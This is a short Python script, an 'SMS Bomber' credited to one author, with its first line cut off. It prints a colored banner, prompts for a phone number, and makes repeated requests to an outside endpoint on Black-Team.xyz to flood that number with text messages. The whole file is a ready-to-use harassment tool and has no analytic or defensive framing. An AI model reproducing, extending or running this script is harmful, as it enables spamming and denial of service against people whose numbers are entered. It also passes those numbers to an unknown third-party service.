mport requests
import time

# Define the colorful logo using ANSI escape codes
logo = """
\033[1;32m***************************************
*   \033[1;33mWelcome to SMS Bomber \033[1;32m        *
*   \033[1;34mPowered by Tajul Islam Rabbi \033[1;32m       *
***************************************
"""

# API URL to send SMS
API_URL = "http://Black-Team.xyz/sms/danger.php?phone="

def send_sms(phone_number):
    try:
        # Make an API call here
        response = requests.get(f"{API_URL}{phone_number}")
        if response.status_code == 200:
            print("\033[1;32mSMS sent successfully.\033[0m")
        else:
            print(f"\033[1;31mFailed to send SMS. Status Code: {response.status_code}\033[0m")
    except Exception as e:
        print(f"\033[1;31mAn error occurred: {str(e)}\033[0m")

def main():
    # Display the logo with color
    print(logo)
    
    # Get user input for phone number
    phone_number = input("\033[1;36mENTER NUMBER: \033[0m")

    # Send SMS 5 times
    for _ in range(5):
        send_sms(phone_number)
        time.sleep(1)  # Wait for 1 second between requests

    print("\n\033[1;32mAll messages sent successfully.\033[0m")

if __name__ == "__main__":
    main()
